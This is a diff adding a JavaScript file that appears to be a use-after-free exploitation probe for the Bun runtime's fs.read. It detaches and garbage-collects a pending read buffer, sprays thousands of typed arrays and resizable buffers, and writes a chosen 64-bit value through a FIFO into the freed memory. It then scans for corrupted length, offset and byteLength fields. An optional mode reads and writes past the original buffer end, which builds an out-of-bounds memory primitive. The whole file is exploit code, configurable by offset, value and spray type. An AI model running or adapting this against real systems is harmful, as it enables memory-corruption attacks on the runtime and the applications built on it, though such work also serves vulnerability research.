@@ -1,0 +1,306 @@
+import fs from "node:fs";
+import { spawnSync } from "node:child_process";
+import { join } from "node:path";
+import { tmpdir } from "node:os";
+
+const iterations = Number(process.env.ITERATIONS || 8);
+const uafSize = Number(process.env.UAF_SIZE || 128);
+const viewSize = Number(process.env.VIEW_SIZE || 128);
+const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
+const sprayMode = process.env.SPRAY_MODE || "u8";
+const writeLength = Number(process.env.WRITE_LENGTH || 8);
+const offsets = parseNumberList(process.env.OFFSETS || process.env.WRITE_OFFSET || "48");
+const values = parseBigIntList(process.env.VALUES || process.env.NEW_VALUE || "256");
+const payloadMode = process.env.PAYLOAD_MODE || "u64";
+const expandMode = process.env.EXPAND_MODE || "none";
+const maxChanges = Number(process.env.MAX_CHANGES || 8);
+const stopOnChange = process.env.STOP_ON_CHANGE === "1";
+const rabMax = Number(process.env.RAB_MAX || viewSize * 2);
+const viewOffset = Number(process.env.VIEW_OFFSET || 16);
+const path = join(tmpdir(), `bun-fs-read-metadata-field-matrix-${process.pid}`);
+const retained = [];
+
+const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
+if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
+const fd = fs.openSync(path, fs.constants.O_RDWR);
+
+function parseNumberList(input) {
+  return input.split(",").filter(Boolean).map(value => Number(value.trim()));
+}
+
+function parseBigIntList(input) {
+  return input.split(",").filter(Boolean).map(value => BigInt(value.trim()));
+}
+
+function detach(ab) {
+  if (typeof ab.transfer === "function") ab.transfer(0);
+  else structuredClone({}, { transfer: [ab] });
+}
+
+function gcNow() {
+  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
+  if (typeof globalThis.gc === "function") globalThis.gc();
+}
+
+function hex(value) {
+  return `0x${value.toString(16)}`;
+}
+
+function makePayload(value) {
+  const payload = Buffer.alloc(writeLength, 0);
+  if (payloadMode === "u32-pair") {
+    const low = Number(value & 0xffffffffn);
+    payload.writeUInt32LE(low >>> 0, 0);
+    if (writeLength >= 8) payload.writeUInt32LE(low >>> 0, 4);
+    return payload;
+  }
+
+  let v = value;
+  for (let i = 0; i < Math.min(writeLength, 8); i++) {
+    payload[i] = Number(v & 0xffn);
+    v >>= 8n;
+  }
+  return payload;
+}
+
+function fillView(view, fill) {
+  for (let i = 0; i < view.byteLength; i++) view[i] = fill;
+}
+
+function makeArrayBufferTarget(index) {
+  const fill = (0x41 + (index & 15)) & 0xff;
+  const ab = new ArrayBuffer(viewSize);
+  fillView(new Uint8Array(ab), fill);
+  return ab;
+}
+
+function makeU8Target(index, offset = 0, bufferSize = viewSize) {
+  const fill = (0x61 + (index & 15)) & 0xff;
+  const ab = new ArrayBuffer(bufferSize);
+  const view = new Uint8Array(ab, offset, viewSize);
+  view.fill(fill);
+  return view;
+}
+
+function makeDataViewTarget(index, offset = 0, bufferSize = viewSize) {
+  const fill = (0x71 + (index & 15)) & 0xff;
+  const ab = new ArrayBuffer(bufferSize);
+  const bytes = new Uint8Array(ab, offset, viewSize);
+  bytes.fill(fill);
+  return new DataView(ab, offset, viewSize);
+}
+
+function makeRabU8Target(index, offset = 0) {
+  const fill = (0x81 + (index & 15)) & 0xff;
+  const initial = offset + viewSize;
+  const ab = new ArrayBuffer(initial, { maxByteLength: Math.max(rabMax, initial) });
+  const view = new Uint8Array(ab, offset, viewSize);
+  view.fill(fill);
+  return view;
+}
+
+function makeTarget(index) {
+  switch (sprayMode) {
+    case "arraybuffer":
+      return makeArrayBufferTarget(index);
+    case "u8":
+      return makeU8Target(index);
+    case "u8-offset":
+      return makeU8Target(index, viewOffset, viewOffset + viewSize);
+    case "dataview":
+      return makeDataViewTarget(index);
+    case "dataview-offset":
+      return makeDataViewTarget(index, viewOffset, viewOffset + viewSize);
+    case "rab-u8":
+      return makeRabU8Target(index);
+    case "rab-u8-offset":
+      return makeRabU8Target(index, viewOffset);
+    default:
+      throw new Error("SPRAY_MODE must be arraybuffer, u8, u8-offset, dataview, dataview-offset, rab-u8, or rab-u8-offset");
+  }
+}
+
+function allocateTargets() {
+  retained.length = 0;
+  for (let i = 0; i < sprayCount; i++) retained.push(makeTarget(i));
+}
+
+function getByte(target, offset) {
+  const buffer = target instanceof ArrayBuffer ? target : target.buffer;
+  if (!buffer) return undefined;
+  const bytes = new Uint8Array(buffer);
+  return bytes[offset];
+}
+
+function readField(fn) {
+  try {
+    return fn();
+  } catch (error) {
+    return `threw:${error?.message || error}`;
+  }
+}
+
+function summarizeExpanded(target) {
+  if (expandMode === "none") return undefined;
+
+  const buffer = target instanceof ArrayBuffer ? target : target.buffer;
+  const baseLength = expectedForIndex(0).bufferByteLength;
+  return readField(() => {
+    const alias = new Uint8Array(buffer);
+    const out = {
+      mode: expandMode,
+      length: alias.length,
+      byteLength: alias.byteLength,
+    };
+    if (expandMode === "read" || expandMode === "write") {
+      out.readAtOriginalEnd = alias[baseLength];
+    }
+    if (expandMode === "write") {
+      alias[baseLength] = 0x5a;
+      out.afterWriteAtOriginalEnd = alias[baseLength];
+    }
+    return out;
+  });
+}
+
+function expectedForIndex(index) {
+  switch (sprayMode) {
+    case "arraybuffer": {
+      const fill = (0x41 + (index & 15)) & 0xff;
+      return { bufferByteLength: viewSize, first: fill, last: fill };
+    }
+    case "u8": {
+      const fill = (0x61 + (index & 15)) & 0xff;
+      return { length: viewSize, byteLength: viewSize, byteOffset: 0, bufferByteLength: viewSize, first: fill, last: fill };
+    }
+    case "u8-offset": {
+      const fill = (0x61 + (index & 15)) & 0xff;
+      return { length: viewSize, byteLength: viewSize, byteOffset: viewOffset, bufferByteLength: viewOffset + viewSize, first: fill, last: fill };
+    }
+    case "dataview": {
+      const fill = (0x71 + (index & 15)) & 0xff;
+      return { byteLength: viewSize, byteOffset: 0, bufferByteLength: viewSize, first: fill, last: fill };
+    }
+    case "dataview-offset": {
+      const fill = (0x71 + (index & 15)) & 0xff;
+      return { byteLength: viewSize, byteOffset: viewOffset, bufferByteLength: viewOffset + viewSize, first: fill, last: fill };
+    }
+    case "rab-u8": {
+      const fill = (0x81 + (index & 15)) & 0xff;
+      return { length: viewSize, byteLength: viewSize, byteOffset: 0, bufferByteLength: viewSize, maxByteLength: Math.max(rabMax, viewSize), first: fill, last: fill };
+    }
+    case "rab-u8-offset": {
+      const fill = (0x81 + (index & 15)) & 0xff;
+      return { length: viewSize, byteLength: viewSize, byteOffset: viewOffset, bufferByteLength: viewOffset + viewSize, maxByteLength: Math.max(rabMax, viewOffset + viewSize), first: fill, last: fill };
+    }
+    default:
+      throw new Error(`unhandled SPRAY_MODE ${sprayMode}`);
+  }
+}
+
+function summarizeTarget(target, index) {
+  const view = target instanceof ArrayBuffer ? undefined : target;
+  const buffer = target instanceof ArrayBuffer ? target : view.buffer;
+  const expected = expectedForIndex(index);
+  const summary = {
+    index,
+    kind: sprayMode,
+    length: readField(() => view?.length),
+    byteLength: readField(() => view?.byteLength),
+    byteOffset: readField(() => view?.byteOffset),
+    bufferByteLength: readField(() => buffer?.byteLength),
+    maxByteLength: readField(() => buffer?.maxByteLength),
+    first: readField(() => view ? (view instanceof DataView ? view.getUint8(0) : view[0]) : getByte(target, 0)),
+    last: readField(() => view ? (view instanceof DataView ? view.getUint8(expected.byteLength - 1) : view[expected.length - 1]) : getByte(target, expected.bufferByteLength - 1)),
+  };
+
+  const changed =
+    (expected.length !== undefined && summary.length !== expected.length) ||
+    (expected.byteLength !== undefined && summary.byteLength !== expected.byteLength) ||
+    (expected.byteOffset !== undefined && summary.byteOffset !== expected.byteOffset) ||
+    (expected.maxByteLength !== undefined && summary.maxByteLength !== expected.maxByteLength) ||
+    summary.bufferByteLength !== expected.bufferByteLength ||
+    summary.first !== expected.first ||
+    summary.last !== expected.last;
+
+  if (!changed) return null;
+  summary.expected = expected;
+  summary.expanded = summarizeExpanded(target);
+  return summary;
+}
+
+function scanChanges() {
+  const changed = [];
+  for (let i = 0; i < retained.length; i++) {
+    const summary = summarizeTarget(retained[i], i);
+    if (!summary) continue;
+    changed.push(summary);
+    if (changed.length >= maxChanges) break;
+  }
+  return changed;
+}
+
+async function runCase(caseIndex, iteration, writeOffset, value) {
+  if (writeOffset < 0 || writeLength <= 0 || writeOffset + writeLength > uafSize) {
+    throw new Error("WRITE_OFFSET/WRITE_LENGTH must fit inside UAF_SIZE");
+  }
+
+  const ab = new ArrayBuffer(uafSize);
+  const source = new Uint8Array(ab);
+  source.fill(0x51);
+
+  const done = new Promise(resolve => {
+    fs.read(fd, source, writeOffset, writeLength, null, (err, bytesRead) => resolve({ err, bytesRead }));
+  });
+
+  detach(ab);
+  gcNow();
+  allocateTargets();
+  gcNow();
+
+  fs.writeSync(fd, makePayload(value), 0, writeLength);
+  const result = await done;
+  const changed = scanChanges();
+  console.log(JSON.stringify({
+    caseIndex,
+    iteration,
+    sprayMode,
+    uafSize,
+    viewSize,
+    rabMax,
+    sprayCount,
+    writeOffset,
+    writeLength,
+    value: hex(value),
+    payloadMode,
+    expandMode,
+    bytesRead: result.bytesRead,
+    err: result.err?.message,
+    changedCount: changed.length,
+    changed,
+  }));
+  return changed.length > 0;
+}
+
+let interesting = false;
+let caseIndex = 0;
+
+try {
+  outer:
+  for (const writeOffset of offsets) {
+    for (const value of values) {
+      for (let iteration = 1; iteration <= iterations; iteration++) {
+        caseIndex++;
+        const changed = await runCase(caseIndex, iteration, writeOffset, value);
+        interesting ||= changed;
+        if (changed && stopOnChange) break outer;
+        if (changed) break;
+      }
+    }
+  }
+} finally {
+  fs.closeSync(fd);
+  fs.unlinkSync(path);
+}
+
+process.exitCode = interesting ? 86 : 0;
